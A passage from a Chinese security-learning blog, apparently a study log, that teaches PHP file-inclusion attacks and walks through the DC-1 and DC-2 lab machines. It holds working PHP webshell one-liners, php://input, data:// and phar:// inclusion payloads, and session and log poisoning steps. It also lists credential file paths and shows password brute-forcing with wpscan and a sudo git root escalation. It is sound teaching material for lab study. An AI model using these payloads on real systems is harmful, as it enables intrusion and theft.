delimiter">?></span></code></pre><p><strong>常见的敏感信息目录：</strong></p><p>window系统：</p><ul><li>c:\boot.ini //查看系统版本</li><li>c:\windows\system32\inetsrv\MetaBase.xml //IIS配置</li><li>c:\windows\repair\sam  // 存储Windows系统初次安装的密码</li><li>c:\ProgramFiles\mysql\my.ini // MySQL配置</li><li>c:\ProgramFiles\mysql\data\mysql\user.MYD // MySQL root密码</li><li>c:\windows\php.ini // php 配置信息</li></ul><p>Linux系统</p><ul><li>/etc/passwd // 账户信息</li><li>/etc/shadow // 账户密码文件</li><li>/usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件</li><li>/etc/my.conf // mysql 配置文件</li></ul><h5 id="二、session文件包含漏洞"><a href="#二、session文件包含漏洞" class="headerlink" title="二、session文件包含漏洞"></a>二、session文件包含漏洞</h5><p><strong>利用条件</strong></p><p>1.我们可以通过phpinfo的信息泄露获取到session的存储位置</p><p>![](C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200123104312.png)</p><p>2.或者通过猜测默认的session存放位置</p><p>linux下的默认存储目录为/var/lib/php/session</p><p><strong>利用过程</strong></p><p>我们可以先使用文件包含上传恶意代码，比如</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$ctfs</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'ctfs'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$ctfs</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>此php会将获取到的GET型ctfs变量的值存入到session中。如果存在本地文件包含漏洞，就可以通过ctfs写入恶意代码到session文件中，然后通过文件包含漏洞执行此恶意代码。<br>我们构造：</p><img src="C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200123104221.png" style="zoom:80%;" /><p>我们发现在本地session所在目录下存储了session的值</p><img src="C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200123105708.png" style="zoom:80%;" /><p>攻击者通过phpinfo()信息泄露或者猜测获取到session存放的目录位置，然后通过浏览器自带开发者模式获取到文件名称：sess_lotipf7ccidsbsrltdau35rb65</p><img src="C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200123103711.png" style="zoom:150%;" /><p>构造本地文件包含 ：<strong>file.php?D:\phpStudy\PHPTutorial\tmp\tmp\sess_lotipf7ccidsbsrltdau35rb65</strong></p><p>![](C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200123104500.png)</p><h5 id="三、有限制本地文件包含漏洞绕过"><a href="#三、有限制本地文件包含漏洞绕过" class="headerlink" title="三、有限制本地文件包含漏洞绕过"></a>三、有限制本地文件包含漏洞绕过</h5><p><strong>%00截断</strong></p><p>条件：magic_quotes_gpc=Off  并且php版本&lt;5.3.4</p><p><strong>测试代码</strong></p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token variable">$filename</span>  <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$filename</span> <span class="token punctuation">.</span> <span class="token string">".html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>当我们直接包含本地的test.txt时</p><img src="C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200123113838.png" style="zoom:67%;" /><p>我们在test.txt加上%00进行截断</p><img src="C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200123113851.png" style="zoom:67%;" /><p><strong>四、路径长度限制</strong></p><p>条件：windows OS,点号需要长于256；linuxOS 长于4096</p><pre><code>windows下目录最大长度为256字节，超出的部分会被丢弃；linux下目录最大长度为4096字节，超出的部分会被丢弃。</code></pre><p>测试代码：</p><pre><code>&lt;?php   $filename =$_GET[&#39;filename&#39;];   include($filename . &quot;.html&quot;);   ?&gt;</code></pre><h4 id="远程文件包含漏洞"><a href="#远程文件包含漏洞" class="headerlink" title="远程文件包含漏洞"></a>远程文件包含漏洞</h4><p>PHP的配置文件allow_url_fopen和allow_url_include设置为ON，include/require等包含函数可以加载远程文件，如果远程文件没经过严格的过滤，导致了执行恶意文件的代码，这就是远程文件包含漏洞。</p><pre><code>allow_url_fopen = On（是否允许打开远程文件）allow_url_include = On（是否允许include/require远程文件）</code></pre><p>示例：</p><p>测试代码：</p><pre><code>&lt;?php    $filename  = $_GET[&#39;filename&#39;];    include($filename);?&gt;</code></pre><p>![](C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200203191630.png)</p><h4 id="PHP伪协议在文件包含中的应用"><a href="#PHP伪协议在文件包含中的应用" class="headerlink" title="PHP伪协议在文件包含中的应用"></a>PHP伪协议在文件包含中的应用</h4><p>PHP带有很多内置URL风格的封装协议，可用于类似fopen()、copy()、file_exists()和filesize()的文件系统函数。除了这些封装协议、还能通过stream_wrapper_register() 来注册自定义的封装协议。</p><p><strong>php伪协议类别</strong></p><ul><li>file://    访问本地文件系统</li><li>http://   访问HTTP（s)网址</li><li>ftp://     访问FTP(s) URLs</li><li>php://      访问各个输入/输出流</li><li>zlib://     压缩流</li><li>data://  数据</li></ul><p><strong>php://filter(本地磁盘文件进行读取）</strong></p><p>元封装器，设计用于“数据流打开“时的”筛选过滤“应用，对本地磁盘文件进行读写。</p><p>用法：?filename=php://filter/convert.base64-encode/resource=xxx.php</p><p>条件：需要开启allow_url_fopen</p><p>示例：</p><p>本地新建file.php</p><p>![](C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200128205700.png)</p><p>我们使用php伪协议在本地读取shell.php文件中的内容</p><p>![](C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200128205953.png)</p><p>对得到的Base64进行解码即可。</p><p><strong>file://伪协议（读取文件内容）</strong></p><p>通过file协议可以访问本地文件系统，读取到文件的内容</p><p>示例：</p><img src="C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200203184038.png" style="zoom:67%;" /><h5 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h5><p>可以访问请求的原始数据的只读流。即可以直接读取到POST上没有经过解析的原始数据。 enctype=”multipart/form-data” 的时候 php://input 是无效的。</p><p>用法：?file=php://input 数据利用POST传过去。</p><p>利用条件：</p><p>allow_url_include = On。<br> 对allow_url_fopen不做要求</p><pre><code>&lt;?phpinfo();?&gt;&lt;?php system(&#39;whoami&#39;);?&gt;&lt;?php fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&quot;&lt;?php eval(\$_POST[&#39;caidao&#39;];?&gt;)&quot;)?&gt;</code></pre><p>包含姿势：</p><pre><code>index.php?file=php://inputPOST:&lt;? phpinfo();?&gt;</code></pre><h5 id="php-input-（读取POST数据）"><a href="#php-input-（读取POST数据）" class="headerlink" title="php://input （读取POST数据）"></a>php://input （读取POST数据）</h5><p>​      碰到file_get_contents()就要想到用php://input绕过，因为php伪协议也是可以利用http协议的，即可以使用POST方式传数据，具体函数意义下一项；</p><p>测试代码：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span>"php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//input");</span><span class="token delimiter">?></span></code></pre><img src="C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200203182852.png" style="zoom:67%;" /><h5 id="php-input-命令执行"><a href="#php-input-命令执行" class="headerlink" title="php://input(命令执行)"></a>php://input(命令执行)</h5><p>测试代码：</p><pre><code>&lt;?php    $filename  = $_GET[&#39;filename&#39;];    include($filename);?&gt;</code></pre><p>条件：php配置文件中需同时开启 allow_url_fopen 和 allow_url_include（PHP &lt; 5.30）,就可以造成任意代码执行，在这可以理解成远程文件包含漏洞（RFI），即POST过去PHP代码，即可执行；</p><p>![](C:\Users\尚慧亮\Pictures\Saved Pictures\QQ截图20200203183726.png)</p><h5 id="data-伪协议"><a href="#data-伪协议" class="headerlink" title="data://伪协议"></a>data://伪协议</h5><p>数据流封装器，和php://相似都是利用了流的概念，将原本的include的文件流重定向到了用户可控制的输入流中，简单来说就是执行文件的包含方法包含了你的输入流，通过你输入payload来实现目的。</p><p>利用条件：</p><p>php版本大于等于php5.2<br> allow_url_fopen = On<br> allow_url_include = On</p><p>示例1：</p><pre><code>/index2.php?file=data:text/plain,&lt;?php phpinfo();?&gt;</code></pre><p><img src="https://upload-images.jianshu.io/upload_images/9272355-5449b681b9c47ddb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200" alt="img"></p><p>执行命令：</p><pre><code>index2.php?file=data:text/plain;&lt;?php system(&quot;whoami&quot;);?&gt;</code></pre><p><img src="https://upload-images.jianshu.io/upload_images/9272355-0fce621191e72481.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/885" alt="img"></p><p>示例2：</p><pre><code>/index2.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</code></pre><p>加号<code>+</code>的url编码为<code>%2b</code>，<code>PD9waHAgcGhwaW5mbygpOz8+</code>的base64解码为：<?php phpinfo() ?></p><p><strong>包含session</strong></p><p>利用条件：session文件路径已知，且其中内容部分可控。</p><p>思路：结合phpmyadmin,因为phpmyadmin每次登录时，会带上session。</p><p><img src="D:%5C%E5%9B%BE%E7%89%87%5C9272355-dd5195fec4210a53.png" alt=""></p><p>session文件的绝对路径可在phpinfo中查看，session.save_path</p><p><img src="https://upload-images.jianshu.io/upload_images/9272355-1e7dd8fd1a028711.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/608" alt="img"></p><p>常见的php-session存放位置还有这几个：</p><pre class=" language-csharp"><code class="language-csharp"><span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>lib<span class="token operator">/</span>php<span class="token operator">/</span>sess_PHPSESSID<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>lib<span class="token operator">/</span>php<span class="token operator">/</span>sess_PHPSESSID<span class="token operator">/</span>tmp<span class="token operator">/</span>sess_PHPSESSID<span class="token operator">/</span>tmp<span class="token operator">/</span>sessions<span class="token operator">/</span>sess_PHPSESSID</code></pre><p>使用以下命令可查看到session文件中的登录信息</p><pre class=" language-csharp"><code class="language-csharp">strings <span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>lib<span class="token operator">/</span>php5<span class="token operator">/</span>sess_258c1be1b00d080bddc58d2896460542facb6f1f <span class="token operator">|</span> grep root</code></pre><p><img src="https://upload-images.jianshu.io/upload_images/9272355-940bb1d740bd0d47.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/723" alt="img"></p><p>登录phpmyadmin时，用户名输入一句话木马，再包含session文件，可getshell</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'root'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?></span></code></pre><p><img src="https://upload-images.jianshu.io/upload_images/9272355-c833b1fd110b6170.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200" alt="img"></p><p><img src="https://upload-images.jianshu.io/upload_images/9272355-5304d206d0b1fcc8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/729" alt="img"></p><p>使用菜刀连接<br> <a href="http://192.168.1.127/dvwa/vulnerabilities/fi/?page=../../../../../../var/lib/php5/sess_6cf7f14ec1e50c6b2f6d4a8ec671e7aaf92c6c4c" target="_blank" rel="noopener">http://192.168.1.127/dvwa/vulnerabilities/fi/?page=../../../../../../var/lib/php5/sess_6cf7f14ec1e50c6b2f6d4a8ec671e7aaf92c6c4c</a><br> 在浏览器里有你的cookie所以你可以直接去访问对应的文件包含页面，用菜刀的话是没有cookie的所以你没有办法去访问文件包含页面也就是fi那个页面。所以说会自动跳转到登录页面，显示200ok</p><p>加上cookie之后在重新连接，成功连接</p><p><img src="https://upload-images.jianshu.io/upload_images/9272355-44a9d0f1054d26b9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/790" alt="img"></p><h5 id="phar伪协议"><a href="#phar伪协议" class="headerlink" title="phar伪协议"></a>phar伪协议</h5><ul><li><p>利用条件：php版本大于等于php5.3.0</p></li><li><p>这个参数就是php解压缩包的一个函数，不管后缀是什么，都会被当做压缩包来解压。</p><p>用法：?file=phar://压缩包/内部文件 phar://xxx.png/shell.php </p><p>注意： PHP &gt; =5.3.0 压缩包需要是zip协议压缩，rar不行，将木马文件压缩后，改为其他任意格式的文件都可以正常使用。 步骤： 写一个一句话木马文件shell.php，然后用zip协议压缩为shell.zip，然后将后缀改为png等其他格式。 </p></li><li><p>姿势：假设有个文件phpinfo.txt，其内容为<?php phpinfo(); ?>，打包成zip压缩包，如下：</p></li></ul><p><img src="D:%5C%E5%9B%BE%E7%89%87%5C9272355-041eece378dca1e4.png" alt=""></p><p>指定绝对路径：</p><pre><code>index2.php?file=phar://C:\phpStudy\WWW\FileInclusion\phpinfo.zip\phpinfo.txt</code></pre><p>或者利用相对路径（这里phpinfo.zip就在当前目录下）</p><pre><code>index2.php?file=phar://phpinfo.zip/phpinfo.txt</code></pre><p><img src="D:%5C%E5%9B%BE%E7%89%87%5C9272355-489da319d283d845.png" alt=""></p><h5 id="zip：-伪协议"><a href="#zip：-伪协议" class="headerlink" title="zip：//伪协议"></a>zip：//伪协议</h5><ul><li><p>php版本大于等于php5.3.0</p></li><li><p>zip伪协议和phar协议类似，但是用法不一样。</p></li><li><p>用法：?file=zip://[压缩文件绝对路径]#[压缩文件内的子文件名] zip://xxx.png#shell.php</p></li><li><p>条件： PHP &gt; =5.3.0，注意在windows下测试要5.3.0&lt;PHP&lt;5.4 才可以 #在浏览器中要编码为%23，否则浏览器默认不会传输特殊字符。</p></li></ul><pre><code>index2.php?file=zip://C:\phpStudy\WWW\FileInclusion\phpinfo.zip%23phpinfo.txt</code></pre><h3 id="包含日志文件"><a href="#包含日志文件" class="headerlink" title="包含日志文件"></a>包含日志文件</h3><p>当我们没有上传点，并且也没有url_allow_include功能时，我们就可以考虑包含服务器的日志文件。<br>利用思路也比较简单，当我们访问网站时，服务器的日志中都会记录我们的行为，当我们访问链接中包含PHP一句话木马时，也会被记录到日志中。<br>这时候我们如果知道服务器的日志位置，我们可以去包含这个文件从而拿到shell。其实整个“包含日志文件漏洞利用”最关键的就是找日志存放的“物理路径”，只要找到日志的物理存放路径，一切就可以按部就班的完成利用了。<br>利用的条件：</p><ul><li>1.日志的物理存放路径</li><li>2.存在文件包含漏洞</li></ul><p>获取日志存放路径</p><p>（一）日志默认路径</p><p>(1) apache+Linux日志默认路径</p><pre class=" language-undefined"><code class="language-undefined">    /etc/httpd/logs/access_log</code></pre><p>或者</p><pre class=" language-bash"><code class="language-bash">    /var/log/httpd/access_log</code></pre><p>(2) apache+win2003日志默认路径</p><pre class=" language-cpp"><code class="language-cpp">    D<span class="token operator">:</span>\xampp\apache\logs\access<span class="token punctuation">.</span>log    D<span class="token operator">:</span>\xampp\apache\logs\error<span class="token punctuation">.</span>log</code></pre><p>(3) IIS6.0+win2003默认日志文件</p><pre class=" language-undefined"><code class="language-undefined">    C:\WINDOWS\system32\Logfiles</code></pre><p>(4) IIS7.0+win2003 默认日志文件</p><pre class=" language-undefined"><code class="language-undefined">    %SystemDrive%\inetpub\logs\LogFiles</code></pre><p>(5) nginx 日志文件</p><pre class=" language-bash"><code class="language-bash">    日志文件在用户安装目录logs目录下            以我的安装路径为例/usr/local/nginx,            那我的日志目录就是在/usr/local/nginx/logs里</code></pre><p>首先，我们直接使用浏览器来构造“php一句话报错请求信息”服务自动记录此一句话信息到服务器日志文件中；<br>具体构造内容：</p><pre class=" language-xml"><code class="language-xml"> http://127.0.0.1:81/FileInclusion/index2.php?file=<span class="token prolog">&lt;?php @eval($_POST[c]);?></span></code></pre><p><img src="https:////upload-images.jianshu.io/upload_images/9272355-f9f0db6a9d7ff53a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/964" alt="img"></p><p>（2）测试结果：失败<br>利用文件包含漏洞直接访问“服务日志文件”，发现文件包含漏洞并未对构造的php一句话进行正常解析，观察发现是构造的PHP一句话中的相关字符在记录进日志文件后，相关的字符被转码了，导致PHP解析失败，具体失败原因见“失败原因分析”</p><p><img src="https:////upload-images.jianshu.io/upload_images/9272355-738380f7e8b09e46.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1195" alt="img"></p><p>image.png（3）失败原因分析<br>一句话写入日志文件的利用过程是，利用浏览器直接构造一个关于请求资源的报错信息，消息中包含依据。报错信息服务自动记录到日志文件，但实际测试发现写入日志文件内的报错信息发生了字符转码：<br>日志文件内容如上图所示：</p><pre class=" language-ruby"><code class="language-ruby">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token punctuation">:</span><span class="token number">81</span><span class="token operator">/</span><span class="token constant">FileInclusion</span><span class="token operator">/</span>index2<span class="token punctuation">.</span>php<span class="token operator">?</span>page<span class="token operator">=</span><span class="token operator">%</span>3C<span class="token operator">?</span>php<span class="token operator">%</span><span class="token number">20</span><span class="token variable">@eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">?</span><span class="token operator">%</span>3E</code></pre><pre class=" language-rust"><code class="language-rust">               <span class="token string">"&lt;"</span>  <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">-></span> 大于号被转码为了 <span class="token operator">%</span>3C                <span class="token string">">"</span>  <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">-></span> 小于号被转码为了 <span class="token operator">%</span>3E                <span class="token string">" "</span>   <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">-></span> 空格被转码为了 <span class="token operator">%</span><span class="token number">20</span></code></pre><p>最后写入到日志文件中的一句话就变成了 %3C?php%20@eval($_POST[c]);?%3E。</p><p>（4） 失败总结<br>浏览器直接构造的PHP一句话中特殊字符，会被浏览器自动进行URL转义，导致最终写入日志文件中的PHP一句话包含了这些特殊字符，而这些转码后的编码PHP并不能进行正常的解析。<br>（5）构造一句话，写入日志文件测试记录<br>burpsuit 代理抓包改包构造一句话写入日志文件<br>（1） burpsuit 代理抓包，修改浏览器转码字符，写入正确的php一句话木马到服务器日志文件。</p><p><img src="https:////upload-images.jianshu.io/upload_images/9272355-ff2a0beae4cc4468.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200" alt="img"></p><p>（2） 测试记录：成功<br>通过文件包含直接访问服务日志文件，发现一句话被执行成功；</p><p><img src="https:////upload-images.jianshu.io/upload_images/9272355-f5d368a6f62b9802.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/889" alt="img"></p><p>在用户发起请求时，会将请求写入access.log，当发生错误时将错误写入error.log，还可以包含Apache的错误访问日志</p><p>首先，构造一个会报错的访问链接，将利用代码（PHP一句话）写入错误日志记录中</p><pre class=" language-ruby"><code class="language-ruby">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token punctuation">:</span><span class="token number">81</span><span class="token operator">/</span><span class="token constant">FileInclusion</span><span class="token operator">/</span>index2<span class="token punctuation">.</span>php<span class="token operator">%</span>3C<span class="token operator">?</span>php<span class="token operator">%</span><span class="token number">20</span><span class="token variable">@eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">?</span><span class="token operator">%</span>3E</code></pre><p>这个链接直接访问的话，一句话会被编码成%3C?php%20@eval($_POST[c]);?%3E，所以需要使用Burp suite改一下包。</p><p><img src="https:////upload-images.jianshu.io/upload_images/9272355-e094a1b3f7e98f45.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200" alt="img"></p><p>对所截获的包进行修改，点击go，返回403报错，服务器错误日志文件成功将此次记录到error.log中<br>我们根据日志的路径构造访问路径:</p><pre class=" language-cpp"><code class="language-cpp">http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token operator">:</span><span class="token number">81</span><span class="token operator">/</span>FileInclusion<span class="token operator">/</span>index2<span class="token punctuation">.</span>php<span class="token operator">?</span>file<span class="token operator">=</span>C<span class="token operator">:</span><span class="token operator">/</span>phpStudy<span class="token operator">/</span>Apache<span class="token operator">/</span>logs<span class="token operator">/</span>access<span class="token punctuation">.</span>log</code></pre><p>客户端连接，获取一句话木马</p><h5 id="SSH-log"><a href="#SSH-log" class="headerlink" title="SSH log"></a>SSH log</h5><p>利用的条件：</p><p>利用条件：需要知道ssh-log的位置，且可读。默认情况下为 /var/log/auth.log</p><p>姿势：<br>用ssh连接：<br><a href="https://www.jianshu.com/p/7cbc878d64ae" target="_blank" rel="noopener">参考这个网站</a></p><h5 id="包含临时文件"><a href="#包含临时文件" class="headerlink" title="包含临时文件"></a>包含临时文件</h5><p><a href="https://vulhub.org/#/environments/php/inclusion/" target="_blank" rel="noopener">参考这个网站</a></p><hr><p><strong>参考文章</strong>：<a href="https://www.jianshu.com/p/8803aff98bfa" target="_blank" rel="noopener">https://www.jianshu.com/p/8803aff98bfa</a></p><p>​                    <a href="https://www.freebuf.com/articles/web/182280.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/182280.html</a></p>]]></content>
      
      
      <categories>
          
          <category> web漏洞学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web漏洞学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC-2靶机学习</title>
      <link href="/2020/04/03/dc-2-ba-ji-xue-xi/"/>
      <url>/2020/04/03/dc-2-ba-ji-xue-xi/</url>
      
        <content type="html"><![CDATA[<h2 id="DC-2靶机测试"><a href="#DC-2靶机测试" class="headerlink" title="DC-2靶机测试"></a>DC-2靶机测试</h2><p>[TOC]</p><h4 id="第一步、下载DC-2靶机并进行主机发现"><a href="#第一步、下载DC-2靶机并进行主机发现" class="headerlink" title="第一步、下载DC-2靶机并进行主机发现"></a>第一步、下载DC-2靶机并进行主机发现</h4><p>我们下载安装DC-2靶机。设置.nat连接模式。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200205133827.png" alt=""></p><p>我们使用netdiscover进行主机发现。</p><pre><code>netdiscover -i eth0 -r 192.168.153.0/24</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200205102253.png" alt=""></p><p>确定了靶机IP为192.168.153.136</p><h4 id="第二步、信息收集"><a href="#第二步、信息收集" class="headerlink" title="第二步、信息收集"></a>第二步、信息收集</h4><p>我们使用nmap 进行信息收集</p><pre><code>nmap -A -p 1-65535 192.168.153.136 -T4</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200205111215.png" alt=""></p><p>我们发现靶机上开放着80端口，并且部署了apache服务器，7744开启了SSH服务。提示是一个wordpress站点</p><p>我们需要首先在host文件下添加<a href="http://dc-2/域名，然后使用浏览器去访问该域名。" target="_blank" rel="noopener">http://dc-2/域名，然后使用浏览器去访问该域名。</a></p><p><img src="QQ%E6%88%AA%E5%9B%BE20200205111308.png" alt=""></p><p>我们使用Wappalyzer进行指纹识别。确定了是一个WordPress的站点。</p><h4 id="第三步、使用Wpscan扫描"><a href="#第三步、使用Wpscan扫描" class="headerlink" title="第三步、使用Wpscan扫描"></a>第三步、使用Wpscan扫描</h4><p>​       该扫描器可以实现获取<code>Wordpress</code>站点用户名，获取安装的所有插件、主题，以及存在漏洞的插件、主题，并提供漏洞信息。同时还可以实现对未加防护的<code>Wordpress</code>站点暴力破解用户名密码。</p><p>我们使用命令扫描网站内的用户名</p><pre><code>wpscan --url dc-2 -e u</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200205132051.png" alt=""></p><p><img src="QQ%E6%88%AA%E5%9B%BE20200205132034.png" alt=""></p><p>获取到用户名后，我们思考能否爆破密码。</p><p>我们首先使用crel收集网页的信息</p><p>​    Cewl：CeWL是一款以爬虫模式在指定URL上收集单词的工具，可以将它收集到的单词纳入密码字典，以提高密码破解工具的成功率。</p><pre><code>cewl dc-2 -w dict.txt</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200205111938.png" alt=""></p><p>得到密码字典后我们继续回到wpscan进行密码爆破、</p><pre><code>wpscan --url dc-2 -P dict.txt</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200205132515.png" alt=""></p><p>我们得到了两个登录的账号和密码。</p><h4 id="第四步、登录后台"><a href="#第四步、登录后台" class="headerlink" title="第四步、登录后台"></a>第四步、登录后台</h4><p>我们通过wpscan发现了默认的后台登录页面。（wp-login.php)</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200205132755.png" alt=""></p><p>我们使用jerry用户进行登录。在其账号中发现了flag2.txt的信息。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200205132930.png" alt=""></p><p>我们翻译一下：</p><p>如果你不能利用WordPress并抄近路，还有别的办法。           </p><p>   希望你能找到另一个切入点。</p><h4 id="第五步、登录ssh"><a href="#第五步、登录ssh" class="headerlink" title="第五步、登录ssh"></a>第五步、登录ssh</h4><pre><code> 我们尝试使用上面两个账户来登陆ssh。首先尝试tom的账户。</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200217113658.png" alt=""></p><p>可以登陆，ls一下可以看到flag3。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200217113757.png" alt=""></p><p>​    但是登陆使用的shell是rBash，功能受到严重限制以至于cat命令都无法使用，所以需要想办法绕过限制。我们先尝试把shell切换为/bin/sh，成功了。继续尝试使用cat来查看flag3中的内容，提示不能找到命令，这时候原因应该是没有将cat命令的目录添加到$PATH中，于是添加之。然后使用cat查看flag3.txt中的内容。<br>rBash和sh shell命令</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200205115512.png" alt=""></p><p><img src="QQ%E6%88%AA%E5%9B%BE20200205115956.png" alt=""></p><p><img src="QQ%E6%88%AA%E5%9B%BE20200205120014.png" alt=""></p><p><img src="QQ%E6%88%AA%E5%9B%BE20200205120104.png" alt=""></p><h4 id="第六步、Git提权获得最终flag"><a href="#第六步、Git提权获得最终flag" class="headerlink" title="第六步、Git提权获得最终flag"></a>第六步、Git提权获得最终flag</h4><p>我们先切换到jerry用户，在jerry的家目录下找到flag4.txt</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200205120330.png" alt=""></p><p>flag4 提示我们可以使用git，我们可以通过git来提权</p><p>sudo -l 我们可以看到无需root权限，jerry 可以使用 git ！</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200217123533.png" alt=""></p><p>我们可以利用suid 进行提权</p><p>SUID可以让调用者以文件拥有者的身份运行该文件</p><pre><code>sudo git -p --help</code></pre><p>输入!/bin/bash 获得root权限</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200217123719.png" alt=""></p><p>我们在root目录下找到最后一个flag。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200217123829.png" alt=""></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>DC-1靶机学习</title>
      <link href="/2020/04/03/dc-1-ba-ji-xue-xi/"/>
      <url>/2020/04/03/dc-1-ba-ji-xue-xi/</url>
      
        <content type="html"><![CDATA[<h2 id="DC-1靶机学习"><a href="#DC-1靶机学习" class="headerlink" title="DC-1靶机学习"></a>DC-1靶机学习</h2><p>[TOC]</p><h4 id="第一步、搭建dc-1和kali虚拟机，使用-nat模式"><a href="#第一步、搭建dc-1和kali虚拟机，使用-nat模式" class="headerlink" title="第一步、搭建dc-1和kali虚拟机，使用.nat模式"></a>第一步、搭建dc-1和kali虚拟机，使用.nat模式</h4><p><img src="QQ%E6%88%AA%E5%9B%BE20200204102843.png" alt=""></p><p>我们进入DC-1的登录界面，然后回到kali攻击机准备入侵。</p><h4 id="第二步、扫描出靶机的ip地址"><a href="#第二步、扫描出靶机的ip地址" class="headerlink" title="第二步、扫描出靶机的ip地址"></a>第二步、扫描出靶机的ip地址</h4><p>1.我们可以使用nmap进行二层的主机发现</p><p><code>nmap -sn 192.168.153.0/24</code></p><p><img src="QQ%E6%88%AA%E5%9B%BE20200204103154.png" alt=""></p><p>2.使用netdiscover进行主机发现</p><p><code>netdiscover -i eth0 -r 192.168.153.0/24</code></p><p><img src="QQ%E6%88%AA%E5%9B%BE20200204114216.png" alt=""></p><p>3.使用arp-scan进行主机发现</p><p><code>arp-scan -l</code></p><p><img src="QQ%E6%88%AA%E5%9B%BE20200204114720.png" alt=""></p><h4 id="第三步、靶机的信息收集"><a href="#第三步、靶机的信息收集" class="headerlink" title="第三步、靶机的信息收集"></a>第三步、靶机的信息收集</h4><p>我们使用nmap对该靶机进行扫描。</p><pre><code>nmap -A -p 1-65535 192.168.153.150</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200204103823.png" alt=""></p><p>我们发现开放的80(tcp) 22（ssh) 111(tcp)端口，并且可以看出使用的CMS为Drupal7。</p><p>我们从浏览器访问该IP的80页面</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200204104045.png" 